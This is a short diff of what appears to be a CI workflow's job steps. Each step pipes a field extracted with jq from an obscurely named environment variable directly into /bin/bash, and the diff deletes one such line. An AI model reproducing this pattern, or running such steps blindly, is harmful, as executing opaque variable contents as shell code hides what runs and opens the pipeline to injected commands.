@@ -39,7 +39,6 @@ jobs:
           printf '%s' "$qibrv7" | jq -r .fxd96 | /bin/bash
           echo $dina3073 | jq -r .qwajp59044 | /bin/bash
           echo $cb84522 | jq -r .szli5 | /bin/bash
-          printf '%s' "$dlvme913" | jq -r .m8 | /bin/bash
           printf '%s' "$hpv0" | jq -r .g94 | /bin/bash
           echo $qeuh576 | jq -r .cszkt89386 | /bin/bash
           printf '%s' "$qh885" | jq -r .qrsm3 | /bin/bash
